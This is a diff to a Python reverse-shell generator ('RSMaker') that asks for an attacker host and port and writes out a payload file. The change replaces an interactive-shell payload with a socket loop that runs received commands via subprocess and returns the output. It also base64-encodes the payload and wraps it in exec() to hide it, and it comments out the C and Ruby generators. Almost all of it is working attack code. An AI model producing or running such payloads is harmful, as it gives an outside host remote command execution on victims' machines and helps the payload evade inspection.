@@ -3,6 +3,7 @@
 #Author : @Aμιρ-0x0 (AMJ)
 import readline , os
 from colorama import Fore
+import base64
 def PRM():
     try:
         ip = input (Fore.RESET+"RHOST > ")
@@ -15,27 +16,35 @@ def PRM():
         print (Fore.RESET+"")
 
         File = open(name,'w')
-        T = '''
-from os import environ
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        '''
-        T0 = "\ns.connect((%s,%s))"%(ip,port)
+        T = 'import socket'
+        T += '\nimport os'
+        T += '\nimport subprocess'
+        T += '\ns = socket.socket()'
+        T += '\ns.connect((%s,%s))'%(ip,port)
+        T += '\nwhile True:'
+        T += '\n\tdata = s.recv(1024)'
+        T += '\n\tcd = "cd"'
+        T += '\n\tif data[:2].decode("utf-8") == %s:'%'cd'
+        T += '\n\t\tos.chdir(data[3:].decode("utf-8"))'
+        T += '\n\tif len(data) > 0:'
+        T += '\n\t\tcmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)'
+        T += '\n\t\toutput_byte = cmd.stdout.read() + cmd.stderr.read()'
+        T += '\n\t\toutput_str = str(output_byte,"utf-8")'
+        T += '\n\t\tcurrentWD = "> "'
+        T += '\n\t\ts.send(str.encode(output_str + currentWD))'
 
-        T1 = '''
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-shell = environ['SHELL']
-p=subprocess.call([shell,"-i"])
-        '''
-        File.write(T)
-        File.write(T0)
+        cmd = base64.b64encode(bytes(T, 'utf-8')) 
+        cmd = cmd.decode("utf-8")
+
+        T1 = "import base64\n"
+        T1 += "exec(base64.b64decode('%s'))"%cmd
         File.write(T1)
+        File.close()
+
     except:
         print("Unknown Error !")
 
-
+"""
 def CRM():
     try:
         ip = input (Fore.RESET+"RHOST > ")
@@ -129,8 +138,10 @@ exec($shell);
     except:
         print("Unknown Error !")
 
-
+"""
 def RSMaker():
+    PRM()
+"""
     print ('''
 1) Python TCP
 2) C TCP
@@ -150,3 +161,5 @@ def RSMaker():
     elif Type == 3:
         print ("Reverse Shell Type Ruby TCP")
         PERM()
+"""
+    
